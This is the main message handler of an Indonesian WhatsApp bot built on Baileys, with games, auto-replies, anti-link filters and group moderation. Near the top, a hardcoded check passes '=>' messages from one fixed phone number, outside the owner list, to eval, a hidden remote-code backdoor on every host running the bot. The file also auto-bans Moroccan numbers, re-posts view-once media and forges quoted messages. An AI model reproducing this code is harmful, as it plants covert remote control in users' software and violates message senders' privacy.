require('./settings')
require('./lib/listmenu')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { rentfromNFS, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { msgFilter } = require('./lib/antispam')

const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const { NFSInstaMp4 } = require('./scrape/NFSInstaMp4')
const { NFSIgImg } = require('./scrape/NFSIgImg')
const { NFSFb } = require('./scrape/NFSFb')
const { NFSTwitter } = require('./scrape/NFSTwitter')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const NFSverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteNFS = JSON.parse(fs.readFileSync('./NFSMedia/database/NFSvn.json'))
const StickerNFS = JSON.parse(fs.readFileSync('./NFSMedia/database/NFSsticker.json'))
const ImageNFS = JSON.parse(fs.readFileSync('./NFSMedia/database/NFSimage.json'))
const VideoNFS = JSON.parse(fs.readFileSync('./NFSMedia/database/NFSvideo.json'))
const BadNFS = JSON.parse(fs.readFileSync('./database/bad.json'))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))



global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = db.game.tebaklagu = []
let kuismath = db.game.math = []
let vote = db.others.vote = []

module.exports = NFSBotInc = async (NFSBotInc, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await NFSBotInc.decodeJid(NFSBotInc.user.id)
        const NFSTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const NFSTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await NFSBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = NFSverifieduser.includes(sender)
    	const banUser = await NFSBotInc.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        
        //theme sticker reply
        const NFSStickWait = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/wait.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
        const NFSStickAdmin = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/admin.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
        const NFSStickBotAdmin = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/botadmin.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
        const NFSStickOwner = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/owner.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
        const NFSStickGroup = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/group.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
        const NFSStickPrivate = () => {
        let NFSStikRep = fs.readFileSync('./NFSMedia/theme/sticker_reply/private.webp')
        NFSBotInc.sendMessage(from, { sticker: NFSStikRep }, { quoted: m })
        }
                   
        //TIME
        const xtime = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')
        const time2 = moment.tz('Asia/Jakarta').format('HH')
        if(time2 == "01"){var NFSytimewisher = `Selamat Pagi 🌝`}
        if(time2 == "02"){var NFSytimewisher = `Selamat Pagi 🌝`}
        if(time2 == "03"){var NFSytimewisher = `Selamat Pagi 🌝`}
        if(time2 == "04"){var NFSytimewisher = `Selamat Pagi 🌔`}
        if(time2 == "05"){var NFSytimewisher = `Selamat Pagi 🌄`}
        if(time2 == "06"){var NFSytimewisher = `Selamat Pagi 🌇`}
        if(time2 == "07"){var NFSytimewisher = `Selamat Pagi 🌇`}
        if(time2 == "08"){var NFSytimewisher = `Selamat Pagi 🌤️`}
        if(time2 == "09"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "10"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "11"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "12"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "13"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "14"){var NFSytimewisher = `Selamat Siang 🌤️`}
        if(time2 == "15"){var NFSytimewisher = `Selamat Sore 🌥️`}
        if(time2 == "16"){var NFSytimewisher = `Selamat Sore 🌥️`}
        if(time2 == "17"){var NFSytimewisher = `Selamat Sore 🌥️`}
        if(time2 == "18"){var NFSytimewisher = `Selamat Sore 🌃`}
        if(time2 == "19"){var NFSytimewisher = `Selamat Sore 🌃`}
        if(time2 == "20"){var NFSytimewisher = `Selamat Sore 🌃`}
        if(time2 == "21"){var NFSytimewisher = `Selamat Malam 🌃`}
        if(time2 == "22"){var NFSytimewisher = `Selamat Malam 🌃`}
        if(time2 == "23"){var NFSytimewisher = `Selamat Malam 🌜`}
        if(time2 == "00"){var NFSytimewisher = `Selamat Malam 🌜`}

		if (isEval && senderNumber == "6281779122444") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await NFSBotInc.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				NFSBotInc.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}

try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}

const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.settings[botNumber] = {
    	    anticall: true,
    		status: 0,
    		autobio: true
	    }

} catch (err) {
console.error(err)
}

if (!NFSBotInc.public) {
if (!m.key.fromMe) return
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            NFSBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            NFSBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
NFSverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(NFSverifieduser, null, 2))
}

NFSBotInc.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan Tandai Dia!
Dia AFK ${reason ? 'With Reason: ' + alasan : 'No Reason'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika 🎮\n\nJawaban yang benar 🎉\n\nIngin Bermain Lagi? Kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban yang salah!*')
}

//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Permainan telah berakhir` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await NFSBotInc.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await NFSBotInc.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    NFSBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    NFSBotInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) NFSBotInc.sendText(roof.p, `Silahkan pilih \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, `Silahkan pilih \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) NFSBotInc.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nGugatan Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    NFSBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, '_Lawan telah memilih_\nSekarang giliran Anda', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih) NFSBotInc.sendText(roof.p, '_Lawan telah memilih_\nSekarang giliran Anda', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    NFSBotInc.sendText(roof.asal, `_*Hasil Jas*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Anda Keluar dari AFK${user.afkReason ? ' Setelah: ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

// auto set bio
if (db.settings[botNumber].autobio) {
    let setting = global.db.settings[botNumber]
    if (new Date() * 1 - setting.status > 1000) {
    let uptime = await runtime(process.uptime())
    await NFSBotInc.updateProfileStatus(`${NFSBotInc.user.name} | Waktu Aktif : ${runtime(process.uptime())}`)
    setting.status = new Date() * 1
    }
}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return NFSBotInc.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
    console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
    return await NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    }
}

async function sendNFSBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await NFSBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by NFS
const replygcNFS = (teks) => {
NFSBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./NFSMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}

const replygcNFS2 = (teks) => {
sendNFSBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}

const reply = (teks) => {
NFSBotInc.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
NFSBotInc.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

const sendvn = (teks) => {
NFSBotInc.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//autoreply
for (let BhosdikaNFS of VoiceNoteNFS) {
if (budy === BhosdikaNFS) {
let audiobuffy = fs.readFileSync(`./NFSMedia/audio/${BhosdikaNFS}.mp3`)
NFSBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}

for (let BhosdikaNFS of StickerNFS){
if (budy === BhosdikaNFS){
let stickerbuffy = fs.readFileSync(`./NFSMedia/sticker/${BhosdikaNFS}.webp`)
NFSBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}

for (let BhosdikaNFS of ImageNFS){
if (budy === BhosdikaNFS){
let imagebuffy = fs.readFileSync(`./NFSMedia/image/${BhosdikaNFS}.jpg`)
NFSBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}

for (let BhosdikaNFS of VideoNFS){
if (budy === BhosdikaNFS){
let videobuffy = fs.readFileSync(`./NFSMedia/video/${BhosdikaNFS}.mp4`)
NFSBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Nama* : ${pushname}\n├ *Pengguna* : @${m.sender.split("@")[0]}\n├ *Jam* : ${time2}\n└ *Pesan* : ${m.mtype}`
NFSBotInc.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Mungkin Sudah Dibuka`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
NFSBotInc.sendMessage(m.chat, {
text:`Maaf Anda telah di banned, Tolong chat @${creator.split("@")[0]} untuk unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
